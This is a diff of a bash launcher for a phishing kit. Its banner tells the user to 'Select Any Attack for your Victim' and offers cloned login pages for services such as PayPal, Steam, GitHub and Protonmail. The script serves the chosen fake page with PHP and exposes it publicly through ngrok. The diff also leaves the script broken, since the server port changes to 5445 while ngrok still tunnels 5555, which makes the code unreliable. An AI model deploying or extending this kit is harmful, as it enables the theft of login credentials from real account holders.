@@ -9,17 +9,16 @@ banner() {
 clear
 printf " \e[33;1m ______      _     _     _               \e[0m\n"
 printf " \e[33;1m|  ___/     | |   (_)   | |              \e[0m\n"
-printf " \e[33;1m \ \ _ _  _ | |__  _ ___| |__   ___ _ __ \e[0m\n"
-printf " \e[32;1m  \ \e[33;1m| '_ \| '_ \| / __| '_ \ / _ \ '__|\e[0m\n"
+printf " \e[33;1m \ \  _ ___ | |__  _ ___| |__   ___ _ __ \e[0m\n"
+printf " \e[32;1m  \ \ | __ \| '_ \| / __|  _ \ / _ \ ' _\ \e[0m\n"
 printf " \e[32;1m __\ \| |_) | | | | \__ \ | | |  __/ |   \e[0m\n"
 printf " \e[32;1m/_____| .__/|_| |_|_|___/_| |_|\___|_|   \e[0m\n"
 printf " \e[33;1m      | |                                \e[0m\n"
 printf " \e[33;1m      |_|           \e[1;97m    Version 1.0      \e[0m\n"
 printf " \n"
 printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Hackerspot_01 (N16H7H4WK)\e[0m\n"
-
 printf " \n"
-printf " \e[36;1m-> Select Any Attack for your Victim.:.\e[0m\n"
+printf " \e[36;1m->Select Any Attack for your Victim.:.\e[0m\n"
 printf " \n"
 }
 menu() {
@@ -32,7 +31,7 @@ printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Paypal      \e[0m\e
 printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Steam       \e[0m\e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[1;93m Protonmail  \e[0m\e[1;31m[\e[0m\e[1;77m27\e[0m\e[1;31m]\e[0m\e[1;93m Yandex\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m Twitter     \e[0m\e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[1;93m Spotify     \e[0m\e[1;31m[\e[0m\e[1;77m28\e[0m\e[1;31m]\e[0m\e[1;93m StackoverFlow\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m Playstation \e[0m\e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;93m Reddit      \e[0m\e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;93m Vk\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Adobe       \e[0m\e[1;31m[\e[0m\e[1;77mO\e[0m\e[1;31m] \e[0m\e[1;93mExit\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Adobe       \e[0m\e[1;31m[\e[0m\e[1;77mx\e[0m\e[1;31m] \e[0m\e[1;93mExit\e[0m\n"
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
 if [[ $option == 1 || $option == 01 ]]; then
@@ -118,7 +117,7 @@ server="stackoverflow"
 start
 elif [[ $option == 29 ]]; then
 vk
-elif [[ $option == O || $option == o ]]; then
+elif [[ $option == X || $option == x ]]; then
 exit 1
 else
 printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
@@ -338,7 +337,7 @@ fi
 fi
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
-cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
+cd websites/$server && php -S 127.0.0.1:5445 > /dev/null 2>&1 &
 sleep 2
 ./ngrok http 5555 > /dev/null 2>&1 &
 sleep 10
